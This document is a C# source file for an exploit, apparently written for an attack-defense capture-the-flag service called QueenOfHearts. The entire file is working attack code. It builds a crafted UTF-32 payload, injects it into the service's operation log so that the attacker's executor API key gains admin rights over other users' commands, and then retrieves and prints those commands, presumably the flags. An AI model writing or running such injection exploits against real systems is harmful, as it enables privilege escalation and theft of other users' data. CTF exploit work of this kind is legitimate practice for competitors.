using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using QueenOfHearts.CoreLibrary.Serialization;
using Vostok.Commons.Time;

namespace QExecute.Sploit
{
    class Program
    {
        public const int Marker = 0xD7FF;

        static void Main(string[] args)
        {
            var client = new Client("0.0.0.0",9000);
            var executor = client.AddExecutor();
            GetAdminApiKeys(client, executor, 1);
        }

        private static void GetAdminApiKeys(Client client, AuthorizedRequest executor, int flagCounts)
        {
            var commands = client.GetCommands().ToArray().Take(flagCounts);
            foreach (var command in commands)
            {
                Console.WriteLine($"Attack {command}, admin {executor.ExecutorApiKey}");
                client.InjectOperationToOplog(BuildPayloadString(1, command, executor.ExecutorApiKey));
            }

            Task.Delay(10.Seconds()).Wait();

            foreach (var command in commands)
            {
                var result = client.GetCommand(new GetCommandRequest()
                {
                    CommandName = command,
                    ExecutorApiKey = executor.ExecutorApiKey,
                    ExecutorId = executor.ExecutorId
                });
                Console.WriteLine(result.ToJson());
            }
        }

        private static string BuildPayloadString(int opcode, string victimCommand, string badAdmin)
        {
            var first = Encoding.UTF32.GetBytes(victimCommand);
            var second = Encoding.UTF32.GetBytes(badAdmin);
            var buffer = new List<byte>();

            buffer.AddRange(GetIntBytes(Marker));
            buffer.AddRange(GetIntBytes(opcode));

            buffer.AddRange(GetIntBytes(first.Length));
            buffer.AddRange(first);
            
            buffer.AddRange(GetIntBytes(second.Length));
            buffer.AddRange(second);

            var result = Encoding.UTF32.GetString(buffer.ToArray());
            var checkedBytes = Encoding.UTF32.GetBytes(result);


            var sequenceEqual = checkedBytes.SequenceEqual(buffer);
            if (!sequenceEqual)
            {
                PrintBytes(buffer.ToArray());
                PrintBytes(checkedBytes);
                throw new Exception();
            }
            return result;
        }

        private static void PrintBytes(byte[] buffer)
        {
            Console.WriteLine(GetString(buffer));
        }

        private static string GetString(byte[] buffer)
        {
            return string.Join(" ", buffer.Select(b => b.ToString()));
        }


        private static byte[] GetIntBytes(int i)
        {
            unsafe
            {
                var buffer = new byte[4];
                fixed (byte* ptr = &buffer[0])
                {
                    *(int*) ptr = i;
                }

                return buffer;
            }
        }
    }
}